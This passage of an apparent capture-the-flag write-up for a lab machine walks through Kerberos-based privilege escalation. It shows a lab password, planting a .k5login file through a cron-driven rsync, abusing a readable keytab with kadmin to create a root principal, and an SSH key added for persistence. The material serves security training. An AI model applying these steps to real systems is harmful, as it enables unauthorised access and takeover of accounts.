+22 Jun 19:56:08 ntpdate[21348]: step time server 10.10.10.224 offset +184.995290 sec
+Tue 22 Jun 19:56:08 PDT 2021
+===================================================================================================================================
+
+If we check the time again we can see that we are now within viable range
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[/etc]
+└──╼ $ntpdate -q 10.10.10.224
+server 10.10.10.224, stratum 10, offset +0.033744, delay 0.14085
+22 Jun 19:57:00 ntpdate[21386]: adjust time server 10.10.10.224 offset +0.033744 sec
+===================================================================================================================================
+
+We now want to go into kinit to generate the ticket.
+Commands and Output:
+  ===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $cat users 
+j.nakazawa@realcorp.htb sJB}RM>6Z~64_
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $kinit j.nakazawa
+Password for j.nakazawa@REALCORP.HTB: 
+===================================================================================================================================
+
+Now we can try sshing and see if we can get in.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $ssh j.nakazawa@10.10.10.224
+j.nakazawa@10.10.10.224's password: 
+===================================================================================================================================
+
+We are still asked for a password, so instead we go back and re-edit the conf file and make sure we have the right things in order
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $cat /etc/krb5.conf
+[libdefaults]
+  default_realm = REALCORP.HTB
+
+[realms]
+  REALCORP.HTB = {
+    kdc = realcorp.htb:88
+    }
+===================================================================================================================================
+
+It seems that is in order however it appears that kerberos is quite picky with the order of the domain names specified in our 
+/etc/hosts file, srv01.realcorp.htb as the first host for the IP 10.10.10.224 needs to be specified
+
+Commands and Output:
+===================================================================================================================================
+10.10.10.224 srv01.realcorp.htb realcorp.htb root.realcorp.htb
+===================================================================================================================================
+
+Now let's try loggin in.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $ssh j.nakazawa@10.10.10.224 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Wed Jun 23 04:14:45 2021 from 10.10.14.28
+[j.nakazawa@srv01 ~]$ 
+===================================================================================================================================
+
+We are now in!!!
+
+IF we specify the '-v' flag we can see that, it succeeds with the gssapi-with-mics flag. 
+It chooses the very first entry of the /etc/hosts file. Make sure that kdc or domain conteoller is the very first name for the IP
+address when you resolve it cause it does not resolve them all.
+Commands and Output:
+===================================================================================================================================
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: Authentication succeeded (gssapi-with-mic).
+Authenticated to 10.10.10.224 ([10.10.10.224]:22).
+===================================================================================================================================
+
+We can look at /etc/crontab and there is a script that is being executed every minute.
+Commands and Output:
+===================================================================================================================================
+[j.nakazawa@srv01 ~]$ cat /etc/crontab 
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+* * * * * admin /usr/local/bin/log_backup.sh
+
+
+..
+..
+..
+
+[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+
+..
+..
+..
+
+[j.nakazawa@srv01 ~]$ ls -lla /usr/local/bin/log_backup.sh
+-rwxr-xr--. 1 root admin 229 Dec  9  2020 /usr/local/bin/log_backup.sh
+
+
+===================================================================================================================================
+
+Apparently the rsync uses the /var/log folder within it we can first check what groups we are included in
+Commands and Output:
+===================================================================================================================================
+[j.nakazawa@srv01 log]$ groups
+j.nakazawa squid users
+
+..
+..
+..
+
+[j.nakazawa@srv01 log]$ ls -la | grep squid
+drwx-wx---.  2 admin  squid      41 Dec 24 06:36 squid
+===================================================================================================================================
+
+Since we have access to the squid folder we can write and execute to it but reading is not permitted. 
+What we can do now is write a k5 login entry inside the directory that is being used by the rsync command to gain access
+We will specify the j.nakazawa user as the login entry since we already created a ticket for that user and next time we use ssh
+with the admin user we should be able to login with no password.
+
+Commands and Output:
+===================================================================================================================================
+vi .k5login
+j.nakazawa@REALCORP.HTB
+===================================================================================================================================
+
+We now wait a minute until the rxync command is executed and then attempt to ssh as admin, the purpose of this exercise is to show
+how is it is to become a different user with the kerberos ticket ability. We can also look at klist to show the different sessions
+currently in use that permit us to do this kind of thing on the remote box.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle/www]
+└──╼ $klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: j.nakazawa@REALCORP.HTB
+
+Valid starting     Expires            Service principal
+22/06/21 20:12:54  23/06/21 20:12:53  krbtgt/REALCORP.HTB@REALCORP.HTB
+22/06/21 20:14:44  23/06/21 20:12:53  host/srv01.realcorp.htb@
+	Ticket server: host/srv01.realcorp.htb@REALCORP.HTB
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle/www]
+└──╼ $ssh admin@10.10.10.224
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Wed Jun 23 18:47:01 2021
+[admin@srv01 ~]$ whoami
+admin
+===================================================================================================================================
+
+Now you can see we have successfully gained admin user. This will hold up as long as the ticket shown in klist remains valid and
+.k5login file is executed.
+
+If we go to the squid directory we can check that upon execution of the rsync command all previous file were deleted and access and
+cache files remained in place.
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 squid]$ pwd
+/var/log/squid
+[admin@srv01 squid]$ ls
+access.log  cache.log
+
+..
+..
+..
+[admin@srv01 ~]$ ls -la
+total 108
+drwxr-x---. 3 admin admin   141 Jun 23 19:08 .
+drwxr-xr-x. 4 root  root     37 Nov  3  2020 ..
+lrwxrwxrwx. 1 root  root      9 Dec  9  2020 .bash_history -> /dev/null
+-rw-r--r--. 1 admin admin    24 Jun 23 19:07 .k5login
+-rw-r--r--. 1 admin admin 53043 Jun 23 19:07 squid_logs.tar.gz.2021-06-23-190701
+-rw-r--r--. 1 admin admin 53043 Jun 23 19:08 squid_logs.tar.gz.2021-06-23-190801
+drwx------. 2 admin admin     6 Dec 25 12:08 .ssh
+[admin@srv01 ~]$ cat .k5login 
+j.nakazawa@REALCORP.HTB
+===================================================================================================================================
+
+If we look at admin's directory we can see that .k5login file was written permitting anyone with the nakazawa user in this case 
+having the kerberos ticket for nakazawa can login to admin.
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 ~]$ ls -la
+total 52
+drwxr-x---. 3 admin admin    82 Jun 23 19:10 .
+drwxr-xr-x. 4 root  root     37 Nov  3  2020 ..
+lrwxrwxrwx. 1 root  root      9 Dec  9  2020 .bash_history -> /dev/null
+-rw-r--r--. 1 admin admin 53043 Jun 23 19:10 squid_logs.tar.gz.2021-06-23-191001
+drwx------. 2 admin admin     6 Dec 25 12:08 .ssh
+===================================================================================================================================
+
+However after a while this login conf file is deleted so to maintain persistence adding an ssh key is suggested.
+
+We try adding the public and sshing but this is not permitted, reading the sshd_config file is also restricted.
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 .ssh]$ vi authorized_keys 
+[admin@srv01 .ssh]$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBhNaAHRIlZKJYAsSbfLljc09i5Lv2ViPp2q5/s5VzgqHBTkF2zkWt2apnUwykXn1cJpY27iz/7RPK24ZjQOFgjB4uzHBeJEyfLoacNEvdMFnaUv9jy6kHg5LwFvJQd5CBBTEPCmh+XZ0g6nbvLLbO6PqildLlrNjCBiMQcgbQdDd0VKrmJWhB+cHOHmklZkJYyIHsofY3brfELz+bFYTvo4OfxQ43/Pu69BP7v0RGDQiCFv1MVogeNDCqYGSXybe+CU32teMRuXsZEk01PN9CgRQspULBI1fFJkr0VToZEL1nfFBsNBFquDICicwFE8bc8dpHgQnO6FE1xhcJ3VWDcdJsqFMyRrb0CM1K+R2pCjXO4hX0VUbnWJqEXrUAZ4N1Z2QvXXHn91MZ5ncTGfQZqgGUO7v8p5srKdcSW2mciuuZY2dt7DqP9km9h0Q6bkZyr8KY9yEqrSuN4eGs1ln0ps4jqpqd4/hOPXAB5l5fCFqYGmr2Vv3xTapYDHr8o08=
+[admin@srv01 .ssh]$ cat /etc/ssh/sshd_config
+cat: /etc/ssh/sshd_config: Permission denied
+===================================================================================================================================
+
+We will now start looking at the box itself, we first look at what kind of files we have access to.
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 ~]$ find / -group admin -ls 2>/dev/null | grep -v '/home\|/proc\|/sys\|/run'
+ 16786360      4 -rw-r-----   1  root     admin        1403 Dec 19  2020 /etc/krb5.keytab
+ 34306567      4 -rwxr-xr--   1  root     admin         229 Dec  9  2020 /usr/local/bin/log_backup.sh
+[admin@srv01 ~]$ find / -user admin -ls 2>/dev/null | grep -v '/home\|/proc\|/sys\|/run'
+        4      0 crw--w----   1  admin    tty      136,   1 Jun 23 19:23 /dev/pts/1
+ 33841738      0 drwx-wx---   2  admin    squid          41 Jun 23 19:09 /var/log/squid
+ 50565785      0 -rw-rw----   1  admin    mail            0 Dec  9  2020 /var/spool/mail/admin
+===================================================================================================================================
+
+We exclude all the noisy directories in our search.
+We can access the krb5.keytab conf file, which is useed to automtically authenncticate using kerberos without interaction or access
+to a password. Anyone with read permission to the keytab file can use all keys in the file.
+
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 ~]$ klist -kt /etc/krb5.keytab
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Timestamp         Principal
+---- ----------------- --------------------------------------------------------
+   2 08/12/20 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
+   2 08/12/20 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
+   2 08/12/20 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
+   2 08/12/20 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
+   2 08/12/20 22:15:30 host/srv01.realcorp.htb@REALCORP.HTB
+   2 19/12/20 06:00:42 kadmin/changepw@REALCORP.HTB
+   2 19/12/20 06:00:42 kadmin/changepw@REALCORP.HTB
+   2 19/12/20 06:00:42 kadmin/changepw@REALCORP.HTB
+   2 19/12/20 06:00:42 kadmin/changepw@REALCORP.HTB
+   2 19/12/20 06:00:42 kadmin/changepw@REALCORP.HTB
+   2 19/12/20 06:10:53 kadmin/admin@REALCORP.HTB
+   2 19/12/20 06:10:53 kadmin/admin@REALCORP.HTB
+   2 19/12/20 06:10:53 kadmin/admin@REALCORP.HTB
+   2 19/12/20 06:10:53 kadmin/admin@REALCORP.HTB
+   2 19/12/20 06:10:53 kadmin/admin@REALCORP.HTB
+===================================================================================================================================
+
+We have a bunch of keys we could probably use. Why have muliptle entires has to do with the fact that there are multiple encryption
+types.
+
+This is like having a machine account in active directory, you need some kind of auth between the kdc, needs low level account to
+prevent man in the middle attacks. Which access to kdc. We can even change password account, we also have the admin account which
+allows to do anything tho the kdc including adding an account.
+
+We can now use kadmin and specify the keytab file and principal name to use.
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "list_principals"
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
+K/M@REALCORP.HTB
+host/srv01.realcorp.htb@REALCORP.HTB
+j.nakazawa@REALCORP.HTB
+kadmin/admin@REALCORP.HTB
+kadmin/changepw@REALCORP.HTB
+kadmin/srv01.realcorp.htb@REALCORP.HTB
+kiprop/srv01.realcorp.htb@REALCORP.HTB
+krbtgt/REALCORP.HTB@REALCORP.HTB
+===================================================================================================================================
+
+We note dowwn all the principals on the box all the one without '/' are one we can use to login.
+Instead of listing principals we can add a principal to root.
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "add_principal -pw testingpassword root@REALCORP.HTB"
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
+No policy specified for root@REALCORP.HTB; defaulting to no policy
+Principal "root@REALCORP.HTB" created.
+
+..
+..
+..
+[admin@srv01 ~]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "list_principals"
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
+K/M@REALCORP.HTB
+host/srv01.realcorp.htb@REALCORP.HTB
+j.nakazawa@REALCORP.HTB
+kadmin/admin@REALCORP.HTB
+kadmin/changepw@REALCORP.HTB
+kadmin/srv01.realcorp.htb@REALCORP.HTB
+kiprop/srv01.realcorp.htb@REALCORP.HTB
+krbtgt/REALCORP.HTB@REALCORP.HTB
+root@REALCORP.HTB
+===================================================================================================================================
+
+Now we can see that the new principal has been added for the root user, with this capability we can now switch users to that of root
+Commands and Output:
+===================================================================================================================================
+[admin@srv01 ~]$ ksu
+WARNING: Your password may be exposed if you enter it here and are logged 
+         in remotely using an unsecure (non-encrypted) channel. 
+Kerberos password for root@REALCORP.HTB: : 
+Authenticated root@REALCORP.HTB
+Account root: authorization for root@REALCORP.HTB successful
+Changing uid to root (0)
+[root@srv01 admin]# whoami
+root
+===================================================================================================================================
+
+This must be done asap as the root entry is deleted periodically.
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
